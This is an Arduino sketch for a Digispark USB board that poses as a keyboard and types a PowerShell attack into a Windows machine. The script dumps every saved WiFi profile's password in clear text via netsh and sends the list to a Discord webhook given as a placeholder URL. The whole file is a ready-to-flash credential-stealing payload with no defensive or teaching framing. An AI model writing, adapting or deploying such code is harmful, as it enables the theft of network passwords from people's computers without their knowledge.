#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(500);
  
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);

  DigiKeyboard.print("powershell.exe");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  DigiKeyboard.print("$webhookUrl = \"your_discord_webhook_url_here\"");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  DigiKeyboard.print("$profiles = netsh wlan show profiles | Select-String \"All User Profile\" | ForEach-Object { $_.ToString().Split(\":\")[1].Trim() }");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  DigiKeyboard.print("$message = \"WiFi passwords: `n\"");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  DigiKeyboard.print("foreach ($profile in $profiles) { $profileInfo = netsh wlan show profile name=\"$profile\" key=clear; $passwordLine = $profileInfo | Select-String \"Key Content\"; if ($passwordLine) { $message += \"`nProfile: $profile`nPassword: $($passwordLine -replace '.*:\\s*')`n\" } else { $message += \"`nProfile: $profile`nPassword: <No Password>`n\" } }");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  DigiKeyboard.print("$payload = @{content = $message} | ConvertTo-Json");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  DigiKeyboard.print("Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType \"application/json\" -Body $payload");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  DigiKeyboard.print("exit");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  // Dont touch
}
